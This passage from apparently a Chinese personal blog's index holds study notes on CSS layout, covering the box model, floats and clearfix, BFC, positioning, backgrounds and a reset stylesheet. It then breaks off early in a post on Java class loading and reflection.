class="attribute">border-style</span>: solid double dotted;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*第二种形式</span></span><br><span class="line"><span class="comment">border-x-color/style/width</span></span><br><span class="line"><span class="comment">x为top,left,right,bottom</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">border-top-color</span>: red;</span><br><span class="line">    <span class="attribute">border-right-style</span>: solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>style</code></p><p><code>none</code>无边框</p><p><code>solid</code>实线</p><p><code>dotted</code>点状边框</p><p><code>dashed</code>虚线</p><p><code>double</code>双线</p></li><li><p>简写</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border</span>: <span class="number">10px</span> solid red;</span><br></pre></td></tr></table></figure><p>​    <code>border-x</code>单独设置某边</p><p>​    指定<code>border</code>就等于同时指定四边</p><p>​    也可以用<code>border-x:none;</code>取消某边</p><h3 id="内边距"><a href="#内边距" class="headerlink" title="内边距"></a>内边距</h3><p>内容区与边框之间的东西，<strong>会影响整个盒子的大小</strong></p><ul><li>边距只能设置宽度</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#008000</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>:<span class="number">10px</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>background-color</code>会填充整个盒子的范围</p></li><li><p>盒子可见框宽度由<strong>内边距，内容区，边框</strong>决定</p><p><code>boder-left+padding-left+width+boder-right+padding-right</code></p></li><li><p>当盒子（块）宽默认时，padding水平值不会影响盒子宽</p></li><li><p>简写</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">2em</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*更多同border*/</span></span><br></pre></td></tr></table></figure><h3 id="外边距"><a href="#外边距" class="headerlink" title="外边距"></a>外边距</h3><p>指与其他元素的间距，<strong>不影响盒子可见宽度</strong>，元素默认靠左上</p><ul><li><p>当前间距＞设置间距时不变</p></li><li><p>可指定负值，会朝反方向移动</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">margin-top</span>:<span class="number">100px</span>;</span><br><span class="line"><span class="attribute">margin-right</span>: -<span class="number">100px</span>;</span><br></pre></td></tr></table></figure><ul><li><p>水平方向可以设置auto，会将外边距设置为最大值</p></li><li><p>垂直方向外边距设置为auto，与默认没区别</p></li><li><p>左右都设置auto，则左右相等，也就是在父元素居中</p></li><li><p>简写</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">3em</span> <span class="number">300%</span> <span class="number">39px</span>;</span><br></pre></td></tr></table></figure><p><strong>垂直外边距的重叠</strong></p><p>box1和box2是相邻的兄弟元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#box1</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: red;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">margin-bottom</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#box2</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: green;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><u><strong>相邻</strong></u>的兄弟元素外边距重叠时取<strong><u>最大值</u></strong></p></li><li><p><u>相邻</u>的父子元素<strong><u>垂直</u></strong>外边距重叠时，子元素的会传给父元素</p><p>但我们一般不想要这种重叠，所以有几个解决方法</p></li><li><p><strong>方法一</strong></p><p>加内容，或用border和padding使其不相邻，但影响可见宽度</p><p>或者给父元素加内边距（子元素取消外边距），但影响了可见框，需要控制宽高</p></li><li><p><strong>方法二</strong></p><p>1.相邻的地方加一个table可以阻止相邻(但添加了无用结构)</p><p>2.使用:before和display替换成table，类似1的方法(完美方案)</p><p>试例代码}/<em>用content添加内容</em>/</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*CSS3 引入 ::before  是为了将伪类和伪元素区别开来。浏览器也接受由CSS 2 引入的 :before 写法*/</span></span><br><span class="line"><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line"><span class="attribute">content</span>:<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="attribute">display</span>:table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内容区"><a href="#内容区" class="headerlink" title="内容区"></a>内容区</h3><p>放置子元素的地方</p><blockquote><p>因为浏览器都有一些默认的边框，边距，不利于布局，所以需要清除浏览器默认样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h2 id="内联元素的盒子"><a href="#内联元素的盒子" class="headerlink" title="内联元素的盒子"></a>内联元素的盒子</h2><p>内联元素：<code>span a iframe img</code></p><ul><li><p>不能设置<code>width</code>和<code>height</code></p></li><li><p>可以设置<code>padding-top/bottom</code>，但不会影响布局（会影响显示效果）</p></li><li><p>可以设置<code>padding-left/right</code>，影响左右</p></li><li><p>设置<code>border-top/bottom</code>，但不会影响布局（会影响显示效果）</p></li><li><p>可以设置<code>border-left/right</code>，影响左右</p></li><li><p>设置<code>margin-left/right</code>，外边距重合时不会重叠，而是相加</p></li><li><p>不支持垂直<code>margin</code></p></li></ul><h2 id="display和visibility"><a href="#display和visibility" class="headerlink" title="display和visibility"></a>display和visibility</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">display</span>: inline;</span><br></pre></td></tr></table></figure><p>可以修改元素的类型</p><ul><li><p>值</p><p><code>inline</code>变成行内元素</p><p><code>block</code>变为块元素</p><p><code>inline-block</code>行内块元素（既有宽高，也不换行）</p><p><code>table</code>具有表格特征<br><code>none</code>隐藏元素，且不占位置</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">visibility</span>: visible;</span><br></pre></td></tr></table></figure><ul><li><p>值</p><p><code>visible</code>默认值</p><p><code>hidden</code>隐藏，但占位置</p></li></ul><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p> 子元素默认是在父元素的内容区的，但子元素如果比父元素大，则默认会显示到父元素外，通过overflow可以控制溢出内容</p><ul><li><p>值</p><p><code>visible</code>默认值</p><p><code>hadden</code>砍掉溢出的</p><p><code>scroll</code>加上滚动条，但不管内容是否溢出</p><p><code>auto</code>根据需求添加scroll]</p></li></ul><h2 id="文档流"><a href="#文档流" class="headerlink" title="文档流"></a>文档流</h2><p>网页的底层，表示一个页面的位置，创建的元素默认在文档流中</p><p>特点</p><ul><li><strong>块元素</strong>独占一行，自上而下</li><li><strong>块元素</strong>默认宽度是父元素的100%</li><li>默认高度被内容撑开</li><li>内联元素在文档中只占自身大小，默认从左到右排列</li><li>内联高宽都被内容撑开</li></ul><h2 id="float浮动"><a href="#float浮动" class="headerlink" title="float浮动"></a>float浮动</h2><p>要使块元素水平排列，可以使元素脱离文档流</p><p>值</p><p><code>none</code>默认在文档流中</p><p><code>left，right</code>左右浮动</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">float</span>: left;</span><br></pre></td></tr></table></figure><p>当给元素设置浮动后，元素脱离文档流，位置也会变，尽量像左上和右上移，直到遇到父边界或者其他浮动元素，如果浮动元素上面是一个块元素，则浮不上去，浮动的元素不会超过他上边的兄弟元素，顶多和他对齐</p><p>特点</p><ul><li><p>浮动元素<strong>不能盖住文字</strong>，文字会环绕在浮动元素周围</p></li><li><p>块元素浮动后高宽默认被文字撑开</p></li><li><p>内联元素浮动变块元素</p></li></ul><h2 id="高度塌陷"><a href="#高度塌陷" class="headerlink" title="高度塌陷"></a>高度塌陷</h2><p>浮动元素的缺点就是脱离文档流后父元素的高度塌陷（无法撑开父元素）</p><p>若给父元素高度写死，则父元素不会随子元素变化</p><h3 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h3><p><code>Block Formatting Context</code>是w3c的一个隐含环境，默认关闭</p><p><strong>特点</strong></p><ul><li><p><strong>父元素和子元素的垂直外边距不会重叠</strong></p></li><li><p><strong>开启的元素不会被浮动元素覆盖</strong></p></li><li><p><strong>开启的元素可以包含浮动的元素</strong></p></li></ul><p><strong>设置方法</strong>(加下滑线是推荐方式)</p><p>1.设置元素浮动</p><p>虽然可以撑开父元素，但父元素的<u>宽度塌陷</u>（不会布满父元素，随内容撑开），且影响</p><p>布局</p><p>2.设置元素绝对定位<code>position</code></p><p>3.设置父（塌陷）元素为<code>inline-block</code></p><p>不会影响布局，但宽度依然塌陷</p><p><strong><u>4.</u></strong>将塌陷元素的<code>overflow</code>设置为非<code>visible</code></p><p>推荐hidden（副作用小，与相对定位冲突）</p><p><em>不兼容IE6</em></p><p><u><strong>5.</strong></u>clear</p><ul><li><p>left</p></li><li><p>right</p></li><li><p>both<strong>清除影响大的</strong></p></li></ul><p><u><strong>6.</strong></u>后塌陷的父元素添加一个空白子块素</p><p>通过clear清楚影响，兼容性好，唯一的缺点就是添加多余的结构</p><p>示例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css"><span class="selector-class">.box1</span>&#123;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>:<span class="number">10px</span> red solid;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.box2</span>&#123;</span></span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: <span class="number">#008000</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.clear</span>&#123;</span></span><br><span class="line"><span class="css"><span class="attribute">clear</span>:both;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clear&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><u><strong>7.</strong></u>同6原理，利用:after，给父元素加上:after</p><p>content必须加””，而且没有多余的结构</p><p>代码(以后的元素出现塌陷，只需要加上从<code>class=&quot;clearfix&quot;</code>就行了)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span>:after&#123;</span><br><span class="line">content:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="attribute">display</span>:block;</span><br><span class="line"><span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*ie6不支持*/</span></span><br></pre></td></tr></table></figure><blockquote><p>在IE6中是开启haslayout解决，使用<code>zoom:1</code>，zoom表示放大；或指定一个宽度</p></blockquote><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>可以任意访问元素的位置</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">position</span>: static;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">10px</span>;<span class="comment">/*相对左边移动*/</span></span><br><span class="line"><span class="attribute">right</span>: <span class="number">10px</span>;<span class="comment">/*相对右边移动*/</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">10px</span>;<span class="comment">/*相对上边移动*/</span></span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">10px</span>;<span class="comment">/*相对下边移动*/</span></span><br></pre></td></tr></table></figure><p><code>static</code>默认值</p><h3 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h3><p><code>relative</code></p><p>特点</p><p><u>1.</u>相对是相对原来位置(<strong>相对自身移动</strong>)</p><p><u>2.</u>相对定位的元素<strong>不会脱离文档流</strong></p><p><u>3.</u>会使元素<strong>提升一个层级</strong></p><p><u>4.</u>相对定位<strong>不会改变元素的性质</strong></p><p><u>5.</u>开启相对定位而不<strong>设置偏移量</strong>，也不会变化</p><h3 id="new-粘滞定位"><a href="#new-粘滞定位" class="headerlink" title="[new]粘滞定位"></a>[new]粘滞定位</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">position</span>: sticky;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0px</span>;</span><br></pre></td></tr></table></figure><ul><li>和相对定位差不多</li><li>主要特点就是在到达某个位置时固定不动</li><li>相对于他的父元素定位</li><li>当然因为比较新，所以兼容性不是很好（指IE）</li></ul><h3 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h3><p><code>absolute</code></p><p><strong>特点</strong></p><p><u>1.</u>绝对定位会使元素<strong>脱离文档流</strong></p><p><u>2.</u>需要设置偏移量</p><p><u>3.</u>相对于<strong>最近的开启定位的祖先元素定位</strong>的(一般开启子元素的<code>absolute</code>要开启父元素的<code>relative</code>)，如果所有的祖先元素都没有定位，就<strong>相对于浏览器窗口</strong>进行定位</p><p><u>4.</u><strong>提升层次</strong></p><p><u>5.</u>会改变元素性质，<strong>内联变块，块变内联</strong></p><p><strong>位置</strong></p><ul><li>水平布局</li></ul><p><code>left + margin-left + border-left + padding-left + width + padding-right + border-right + margin-left + right = 父元素的内容区</code></p><p>开启绝对定位后，如果过度约束（left=0，right=0）</p><ul><li>9个值没有auto则自动调整right使等式满足</li><li>有auto则调整auto</li></ul><p>因为right和left的默认值时auto，默认会先调整这两个使等式满足</p><ul><li>垂直布局</li></ul><p><code>top + margin-top/bottom + padding-top/bottom + bordet-top/bottom + bottom=包含块的高度</code></p><ul><li>同理，top和bottom默认是auto，会先调整这两个</li></ul><blockquote><p>实现双向居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">top</span>:<span class="number">0</span>;</span><br><span class="line"><span class="attribute">bottom</span>:<span class="number">0</span>;</span><br><span class="line"><span class="attribute">left</span>:<span class="number">0</span>;</span><br><span class="line"><span class="attribute">right</span>:<span class="number">0</span>;</span><br><span class="line"><span class="attribute">margin</span>:auto;</span><br></pre></td></tr></table></figure></blockquote><h3 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h3><p><code>fixed</code>（也是绝对定位的一种）</p><p><u>1.</u>固定在浏览器上<strong>不随浏览器滚动而滚动</strong></p><p><u>2.</u>与绝对定位不同的是，<strong>固定定位永远相对于浏览器窗口定位</strong></p><blockquote><p>怎么设置偏移量?</p><p>通过来<code>left right top bottom</code>设置偏移量</p><p>通常使用两个就够了，水平一个，垂直一个</p></blockquote><h3 id="元素的层级"><a href="#元素的层级" class="headerlink" title="元素的层级"></a>元素的层级</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">z-index</span>:<span class="number">4</span>;<span class="comment">/*开启定位才能用*/</span></span><br></pre></td></tr></table></figure><ul><li><p>如果定位层级一样，则下面的元素会盖住上面的</p></li><li><p>但<strong>父元素层级再高也不能盖住子元素</strong></p></li><li><p>z-index（<strong>开启定位才能用</strong>）代表元素的层级</p><ul><li><p>默认值auto</p></li><li><p><strong>正值表示离用户越近</strong></p></li><li><p><strong>负值表示离用户越远</strong></p></li></ul></li><li><p>层级高，优先显示</p></li></ul><h3 id="opacity"><a href="#opacity" class="headerlink" title="opacity"></a>opacity</h3><p>设置元素的透明程度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br></pre></td></tr></table></figure><ul><li><p>可选值0-1</p></li><li><p>ie8及以下使用<code>filter:alpha(opacity:0-100)</code>进行透明</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">filter</span>:<span class="built_in">alpha</span>(opacity:<span class="number">50</span>)</span><br></pre></td></tr></table></figure><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p><strong>background-color</strong></p><p>设置背景颜色</p><p><strong>background-image</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">img/1.jpg</span>);</span><br></pre></td></tr></table></figure><p>插入图片</p><ul><li><p><code>url（相对路径）</code></p></li><li><p>如果图片大于元素，默认显示左上角</p></li><li><p>等于就全显示</p></li><li><p>小于则默认将图片重复平铺充满元素</p></li><li><p>一般同时指定背景图片和颜色，因为图片加载慢</p></li><li><p>背景图片默认左上角</p></li></ul><p><strong>background-repeat</strong></p><p>设置背景图片重复方式</p><ul><li><p><code>repeat</code>默认值，双方向重复</p></li><li><p><code>no-repeat</code>不重复</p></li><li><p><code>repeat-x</code>沿水平方向重复</p></li><li><p><code>repeat-y</code>沿垂直方向重复</p></li></ul><p><strong>bacground-position</strong></p><p>设置图片开始的位置（相对于父元素）</p><ul><li>可以使用<code>right left top botton center</code>的两个来指定一个图片的位置</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-position</span>: right bottom</span><br><span class="line">background-position: right center</span><br><span class="line">background-position: center</span><br></pre></td></tr></table></figure><ul><li><p>也可用<code>x% y%</code>指定</p><ul><li><p>​    比如左上<code>0% 0%</code></p></li><li><p>​    左下<code>0% 100%</code></p></li></ul></li><li><p><code>xpx ypx</code>设置偏移量来指定位置</p><ul><li><p>正值向右或下</p></li><li><p>负值向左或上</p></li><li><p>如果只设置一个值，则另一个是50%</p></li></ul></li></ul><p><strong>background-attachment</strong></p><p>设置背景图片是否跟着页面滚动而滚动</p><ul><li><p><code>scroll</code>默认值，滚动</p></li><li><p><code>fixed</code>固定</p></li><li><p>设置fixed时，永远相对于浏览器窗口</p></li><li><p>不随窗口滚动的图片，一般给body</p></li></ul><p><strong>简写</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backgroud: red  <span class="built_in">url</span>(<span class="string">img01.jpg</span>) center fixed no-repead ;</span><br></pre></td></tr></table></figure><ul><li><p>没有顺序和数量要求</p></li><li><p>注意覆盖</p></li></ul><h2 id="加载闪烁"><a href="#加载闪烁" class="headerlink" title="加载闪烁"></a>加载闪烁</h2><p>在引入外部文件时，浏览器只会在使用时才会去加载，需要一定时间，会导致闪烁，比如按钮图片</p><p><em>解决方法</em></p><ul><li><p>整合所有图片成一张图片</p></li><li><p>使用<code>background-position</code>改变图片位置达到一次加载不闪烁的问题</p></li></ul><p>这种技术叫<strong>CSS-Sprite</strong></p><p><strong>优点</strong></p><ul><li><p>发送一次请求，加载多个图片</p></li><li><p>体积小</p></li><li><p>加载快，提升了用户体验</p></li></ul><h2 id="reset-css"><a href="#reset-css" class="headerlink" title="reset.css"></a>reset.css</h2><p>清除浏览器样式的css文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@charset</span> <span class="string">&#x27;utf-8&#x27;</span>;</span><br><span class="line"><span class="comment">/*这些元素都建议重新初始化*/</span></span><br><span class="line"><span class="selector-tag">body</span>,<span class="selector-tag">div</span>,<span class="selector-tag">dl</span>,<span class="selector-tag">dt</span>,<span class="selector-tag">dd</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">li</span>,<span class="selector-tag">tr</span>,<span class="selector-tag">td</span>,<span class="selector-tag">th</span>,</span><br><span class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>,hr,br,<span class="selector-tag">img</span>,<span class="selector-tag">table</span>,</span><br><span class="line"><span class="selector-tag">input</span>,<span class="selector-tag">form</span>,<span class="selector-tag">a</span>,<span class="selector-tag">p</span>,<span class="selector-tag">textarea</span>&#123;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">font-family</span>:Arial,<span class="string">&#x27;Microsoft YaHei&#x27;</span>,<span class="string">&#x27;宋体&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*去掉列表默认排列*/</span></span><br><span class="line"><span class="selector-tag">ul</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">list-style</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*去掉底部横线*/</span></span><br><span class="line"><span class="comment">/*把a元素更改设置成块级元素，这个根据实际情况决定要不要*/</span></span><br><span class="line"><span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>:none;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*img标签要清除border。*/</span></span><br><span class="line"><span class="comment">/*display设为block设置为块级元素，默认为display:inline;</span></span><br><span class="line"><span class="comment">存在下边线多出4px状况,所以一般设为block*/</span></span><br><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*清除浮动破坏带来的塌陷及父子外边距重叠问题*/</span></span><br><span class="line"><span class="comment">/*清除浮动的兼容IE*/</span></span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>，<span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line"><span class="attribute">display</span>:table;</span><br><span class="line"><span class="attribute">clear</span>:both;</span><br><span class="line"><span class="attribute">content</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://juejin.im/post/5d5925065188252373304e75">参考</a>，本人做了一点修改</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类的加载和反射</title>
      <link href="/Programming/Java/day14_%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8F%8D%E5%B0%84.html"/>
      <url>/Programming/Java/day14_%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8F%8D%E5%B0%84.html</url>
      
        <content type="html"><![CDATA[<p> 对于我来说就是不停机加载类</p><span id="more"></span><h2 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h2><ul><li>当程序运行的时候，系统会首先把要使用的Java类加载到内存中，加载的是编译后的class文件</li><li>每个类加载到内存中，会创建一个对应的<code>Class</code>对像，这个对象保存了这个类有哪些成员（数据，方法）</li><li>我们的程序用到什么类，才会加载什么类</li></ul><h2 id="类的加载器"><a href="#类的加载器" class="headerlink" title="类的加载器"></a>类的加载器</h2><p>作用：将.class文件加载到内存中，生成对应的java.lang.Class对象</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>功能：在程序运行的时候，需要动态的加载一些类这些类可能之前用不到所以不用加载到JVM，而不用停止程序，重新加载程序</p><p>ok，介绍完毕，代码部分</p><p>测试的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 